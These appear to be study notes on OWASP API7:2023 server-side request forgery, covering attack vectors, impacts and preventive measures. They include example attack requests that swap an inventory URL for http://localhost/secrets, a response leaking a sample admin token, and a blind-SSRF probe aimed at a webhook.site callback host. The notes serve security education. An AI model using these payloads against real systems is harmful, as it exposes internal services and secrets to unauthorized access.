# API7:2023 server-side request forgery (SSRF)
* a vulnerability that takes place when a user is able to control the remote resources retrieved by an application
* attacker uses an API to supply their own input, in the form of a URL, to control the remote resources that are retrieved by the targeted server
* said attacker could supply URLs that expose private data, scan the target's internal network or compromise the target through remote code execution
### OWASP attack vector description
* exploitation requires the attacker to find an API endpoint that accesses a URI provided by the client
* basic SSRF (where the response is returned to the attacker) is easier to exploit than blind SSRF (where the attacker does not know whether the attack was successful)
### OWASP security weakness description
* modern concepts in application development encourage developers to access URIs provided by the client
* improper validation of such URIs is a common issue
* regular API requests and response analysis must be done to detect the issue
* when the response is not returned (blind SSRF) detecting the vulnerability requires more effort and creativity
### OWASP impacts description
* successful exploitation might lead to internal services enumeration (e.g. port scanning), information disclosure and bypassing firewalls or other security mechanisms
* may lead to DoS or the server being used as a proxy to hide malicious activities in some cases
### OWASP preventative measures
* isolate the resource fetching mechanism in your network: these features are aimed to retrieve remote resources and not internal ones
* whenever possible, use allow lists of
    * remote origins users are expected to download resources from (e.g. Google Drive, Gravatar etc.)
    * URL schemes and ports
    * accepted media types for a given functionality
* disable HTTP redirections
* use a well-tested and maintained URL parser to avoid issues caused by URL parsing inconsistencies
* validate and sanitise all client-supplied input data
* do not send raw responses to clients
### more ...
* SSRF is a vulnerability that takes place when an application retrieves remote resources without validating user input
    - occurs when an attacker has control over the resources a server requests
    - said attacker can gain access to sensitive data, or worse, completely compromise a vulnerable host  
* impact of this vulnerability is that an attacker is able to leverage the target server to perform and process requests that they supply
    - bug bounties payouts for SSRF are driven by the impact that can be demonstrated with a proof of concept: he higher the demonstrated impact, the higher the bounty
* there are two general types of SSRF: in-band and out-of-band (blind) SSRF
    - in-Band SSRF means that the server responds with the resources specified by the end user
    - say an attacker specifies the payload as `http://google.com` to a server with an in-band SSRF vulnerability. the server would make the request and respond to the attacker with information served from `google.com`
    - blind SSRF takes place when the attacker supplies a URL and the server makes the request but does not send information from the specified URL to the attacker. in the case of Blind SSRF, an attacker needs control over a web server that will capture the request from the target to prove that they were able to force the server to make the request
* example of in-band SSRF
    - intercepted request:

        ```text
            POST api/v1/store/products
            headers ...
            {
                "inventory": "http://store.com/api/v3/inventory/item/12345"
            }
        ```

    - attack

        ```text
            POST api/v1/store/products
            headers ...
            {
                "inventory": "§http://localhost/secrets§"
            }
        ```

    - response

        ```text
            HTTP/1.1 200 OK
            headers ...
            {
                "secret_token": "SecretAdminToken123"
            }
        ```

* example of out-of-band SSRF
    - intercepted request

        ```text
            POST api/v1/store/products
            headers …
            {
                "inventory":"http://store.com/api/v3/inventory/item/12345"
            }
        ```

    - attack

        ```text
            POST api/v1/store/products
            headers …
            {
                "inventory:"§http://localhost/secrets§"
            }
        ``` 

    - response (no indication that the server is vulnerable)

        ```text
            HTTP/1.1 200 OK
            headers...
            {}
        ```

* instead of `http://localhost/secrets`, an attacker can leverage the URL to a web server that will let them see if a request is actually made
* Burp Suite Pro has a great tool called Burp Suite Collaborator; collaborator can be leveraged to set up a web server that will provide us with the details of any requests that are made to our random URL
    - attack viz:

        ``` text
            POST api/v1/store/products
            headers …
            {
            "inventory":"§https://webhook.site/306b30f8-2c9e-4e5d-934d-48426d03f5c0§"
            }
        ```